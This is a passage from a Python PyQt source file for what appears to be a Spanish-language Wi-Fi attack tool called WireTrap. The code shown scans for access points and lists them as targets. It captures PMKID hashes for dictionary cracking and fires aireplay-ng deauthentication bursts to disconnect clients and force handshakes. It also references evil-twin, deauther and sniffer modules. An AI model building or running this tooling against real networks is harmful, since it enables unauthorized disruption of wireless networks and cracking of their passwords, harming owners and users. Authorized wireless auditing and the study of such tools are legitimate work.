        self.btn_wpa2_scan.setFont(QFont("Monospace", 10, QFont.Weight.Bold))
        self.btn_wpa2_scan.setStyleSheet("background-color: #00aa44; color: black; padding: 4px 10px;")
        self.btn_wpa2_scan.clicked.connect(self._on_wpa2_scan_clicked)

        self.wpa2_status = QLabel("● IDLE")
        self.wpa2_status.setFont(QFont("Monospace", 10, QFont.Weight.Bold))
        self.wpa2_status.setStyleSheet("color: gray; font-weight: bold;")
        self.wpa2_status.setMinimumWidth(80)

        header.addWidget(self.wpa2_dict_label)
        header.addWidget(self.wpa2_dict_input)
        header.addSpacing(20)
        header.addWidget(self.wpa2_iface_label)
        header.addWidget(self.wpa2_iface_combo)
        header.addSpacing(10)
        header.addWidget(self.btn_wpa2_scan)
        header.addSpacing(20)
        header.addWidget(self.wpa2_status)
        layout.addLayout(header)

        line = QFrame()
        line.setFrameShape(QFrame.Shape.HLine)
        line.setStyleSheet("color: #444;")
        layout.addWidget(line)

        splitter = QSplitter(Qt.Orientation.Horizontal)
        table_font = QFont("Monospace", 11)
        header_font = QFont("Monospace", 11, QFont.Weight.Bold)

        ap_group = QGroupBox("OBJETIVOS (APs)")
        ap_group.setFont(QFont("Monospace", 12, QFont.Weight.Bold))
        ap_layout = QVBoxLayout(ap_group)
        self.wpa2_ap_table = QTableWidget()
        self.wpa2_ap_table.setColumnCount(6)
        self.wpa2_ap_table.setHorizontalHeaderLabels(["SSID", "BSSID", "Canal", "Seguridad", "Señal", "Clientes"])
        self.wpa2_ap_table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        self.wpa2_ap_table.horizontalHeader().setFont(header_font)
        self.wpa2_ap_table.horizontalHeader().setMinimumHeight(34)
        self.wpa2_ap_table.verticalHeader().setVisible(False)
        self.wpa2_ap_table.setFont(table_font)
        self.wpa2_ap_table.setSelectionBehavior(QTableWidget.SelectionBehavior.SelectRows)
        self.wpa2_ap_table.setEditTriggers(QTableWidget.EditTrigger.NoEditTriggers)
        self.wpa2_ap_table.setAlternatingRowColors(True)
        self.wpa2_ap_table.itemClicked.connect(self._on_wpa2_ap_selected)
        ap_layout.addWidget(self.wpa2_ap_table)
        splitter.addWidget(ap_group)

        log_group = QGroupBox("HCXDUMPTOOL LIVE LOGS")
        log_group.setFont(QFont("Monospace", 12, QFont.Weight.Bold))
        log_layout = QVBoxLayout(log_group)
        self.wpa2_log_text = QTextEdit()
        self.wpa2_log_text.setReadOnly(True)
        self.wpa2_log_text.setFont(table_font)
        self.wpa2_log_text.setStyleSheet("background: #000; color: #00ff00;")
        log_layout.addWidget(self.wpa2_log_text)
        
        btn_layout = QHBoxLayout()
        self.btn_wpa2_start = QPushButton("▶ CAPTURAR PMKID")
        self.btn_wpa2_start.setFont(header_font)
        self.btn_wpa2_start.setStyleSheet("background-color: #00aa44; color: black; padding: 10px;")
        self.btn_wpa2_start.clicked.connect(self._start_wpa2_attack)

        self.btn_wpa2_deauth = QPushButton("💥 FORZAR DEAUTH (HANDSHAKE)")
        self.btn_wpa2_deauth.setFont(header_font)
        self.btn_wpa2_deauth.setStyleSheet("background-color: #ffaa00; color: black; padding: 10px;")
        self.btn_wpa2_deauth.setEnabled(False)
        self.btn_wpa2_deauth.clicked.connect(self._on_wpa2_deauth_clicked)
        
        self.btn_wpa2_stop = QPushButton("🛑 DETENER CAZA")
        self.btn_wpa2_stop.setFont(header_font)
        self.btn_wpa2_stop.setStyleSheet("background-color: #aa0000; color: white; padding: 10px;")
        self.btn_wpa2_stop.setEnabled(False)
        self.btn_wpa2_stop.clicked.connect(self._stop_wpa2_attack)
        
        btn_layout.addWidget(self.btn_wpa2_start)
        btn_layout.addWidget(self.btn_wpa2_deauth)
        btn_layout.addWidget(self.btn_wpa2_stop)
        log_layout.addLayout(btn_layout)

        splitter.addWidget(log_group)
        splitter.setSizes([800, 600])
        layout.addWidget(splitter, 1)  # Stretch factor 1 to push everything up and consume space

    def _on_wpa2_scan_clicked(self):
        if self.scanner and self.scanner.scanning:
            self.scanner.stop()
            self.btn_wpa2_scan.setText("▶ ESCANEAR REDES")
            self.btn_wpa2_scan.setStyleSheet("background-color: #00aa44; color: black; padding: 4px 10px;")
            self.wpa2_status.setText("● DETENIDO")
            self.wpa2_status.setStyleSheet("color: gray; font-weight: bold;")
        else:
            iface = self.wpa2_iface_combo.currentText()
            if not iface:
                QMessageBox.warning(self, "Error", "Selecciona una interfaz Alfa Monitor.")
                return
            self.scanner = Scanner(iface)
            self.scanner.on_ap_found = lambda ap: self.bridge.ap_found.emit(ap)
            self.scanner.on_client_found = lambda c: self.bridge.client_found.emit(c)
            self.scanner.on_log = lambda m: self.bridge.log_message.emit(m)
            self.scanner.start()

            self.btn_wpa2_scan.setText("🛑 DETENER ESCANEO")
            self.btn_wpa2_scan.setStyleSheet("background-color: #aa0000; color: white; padding: 4px 10px;")
            
            self.wpa2_status.setText("● BUSCANDO REDES")
            self.wpa2_status.setStyleSheet("color: #00ff88; font-weight: bold;")
            
            self.wpa2_ap_table.setRowCount(0)
            self.selected_ap = None

    def _on_wpa2_deauth_clicked(self):
        """Lanza aireplay-ng contra la tabla completa (FF:FF:FF:FF:FF:FF) temporalmente"""
        if not self.selected_ap: return
        iface = self.wpa2_iface_combo.currentText()
        self.log_wpa2(f"\\n[💥] RÁFAGA HÍBRIDA: Expulsando clientes temporalmente de {self.selected_ap.bssid} para forzar re-asociaciones...")
        
        def run_deauth():
            import subprocess
            try:
                subprocess.run([
                    "aireplay-ng", "-0", "15", "-a", self.selected_ap.bssid, iface
                ], capture_output=True, timeout=10)
            except Exception as e:
                pass
                
        import threading
        threading.Thread(target=run_deauth, daemon=True).start()

    def _on_wpa2_ap_selected(self):
        row = self.wpa2_ap_table.currentRow()
        if row < 0 or not self.scanner: return
        bssid = self.wpa2_ap_table.item(row, 1).text()
        if bssid in self.scanner.aps:
            self.selected_ap = self.scanner.aps[bssid]
            self.log_wpa2(f"AP seleccionado para PMKID: {self.selected_ap.ssid} ({bssid})")

    def _start_wpa2_attack(self):
        if not self.selected_ap:
            QMessageBox.warning(self, "Error", "Selecciona una red de la tabla.")
            return
            
        if self.scanner:
            self.scanner.stop()
            
        if self.selected_ap.channel:
            import subprocess
            iface_mon = self.wpa2_iface_combo.currentText()
            subprocess.run(["iw", "dev", iface_mon, "set", "channel", str(self.selected_ap.channel)], capture_output=True)
            self.log_wpa2(f"Canal fijado en {self.selected_ap.channel}")

        self.wpa2_engine = WPA2Crypto(self.wpa2_iface_combo.currentText())
        self.wpa2_engine.wordlist = self.wpa2_dict_input.text()
        self.wpa2_engine.on_log = lambda m: self.bridge.log_message.emit(m)
        self.wpa2_engine.on_success = lambda f: self.bridge.pmkid_success.emit(f)
        self.wpa2_engine.on_error = lambda e: self.bridge.pmkid_error.emit(e)
        self.wpa2_engine.on_stopped = self.bridge.attack_stopped.emit
        
        self.wpa2_engine.start_pmkid_attack(self.selected_ap.bssid)
        self.wpa2_status.setText("● ATACANDO")
        self.wpa2_status.setStyleSheet("color: #e94560; font-weight: bold;")
        self.btn_wpa2_start.setEnabled(False)
        self.btn_wpa2_stop.setEnabled(True)
        self.btn_wpa2_deauth.setEnabled(True)

    def _stop_wpa2_attack(self):
        if self.wpa2_engine:
            self.wpa2_engine.stop()
        self.wpa2_status.setText("● IDLE")
        self.wpa2_status.setStyleSheet("color: gray; font-weight: bold;")
        self.btn_wpa2_start.setEnabled(True)
        self.btn_wpa2_stop.setEnabled(False)
        self.btn_wpa2_deauth.setEnabled(False)

    def _on_pmkid_success(self, file_path):
        self.log_wpa2(f"🏆 ¡Hash procesado con éxito!")
        # Stop attack UI triggers since it's going into crack mode
        self.wpa2_status.setText("● CRACKEANDO")
        self.wpa2_status.setStyleSheet("color: #ffaa00; font-weight: bold;")
        self.btn_wpa2_stop.setEnabled(False)
        self.btn_wpa2_deauth.setEnabled(False)

    def _on_pmkid_error(self, error):
        self.log_wpa2(f"❌ Error crítico: {error}")
        self._stop_wpa2_attack()

    def log_wpa2(self, msg):
        import datetime
        import html
        ts = datetime.datetime.now().strftime("%H:%M:%S")
        safe_msg = html.escape(msg)
        if "error" in msg.lower():
            self.wpa2_log_text.append(f"<span style='color: #ff3333;'>[{ts}] {safe_msg}</span>")
        elif "💥" in msg or "ráfaga" in msg.lower():
            self.wpa2_log_text.append(f"<span style='color: #ffaa00;'>[{ts}] {safe_msg}</span>")
        elif "🏆" in msg or "éxito" in msg.lower():
            self.wpa2_log_text.append(f"<span style='color: #00ffff;'>[{ts}] {safe_msg}</span>")
        else:
            self.wpa2_log_text.append(f"<span style='color: #00ff00;'>[{ts}] {safe_msg}</span>")

    # ── MÓDULOS DEL ESCÁNER ───────────────────────────────────

    def _on_stop_clicked(self):
        if self.deauther:
            self.deauther.stop()
        if self.evil_twin:
            # Anular el callback on_stopped antes de parar para evitar
            # que dispare attack_stopped dos veces (una aquí abajo y
            # otra desde el propio evil_twin al terminar).
            self.evil_twin.on_stopped = None
            self.evil_twin.stop()
        if self.sniffer:
            self.sniffer.stop()
        if self.scanner:
            self.scanner.stop()
        self.bridge.attack_stopped.emit()

    # ── Log ───────────────────────────────────────────────────

    def log(self, message: str):
        from datetime import datetime
        ts = datetime.now().strftime("%H:%M:%S")
        self.log_output.append(f"[{ts}] {message}")


# ── Main ──────────────────────────────────────────────────────

if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = WireTrap()
    window.show()
    sys.exit(app.exec())
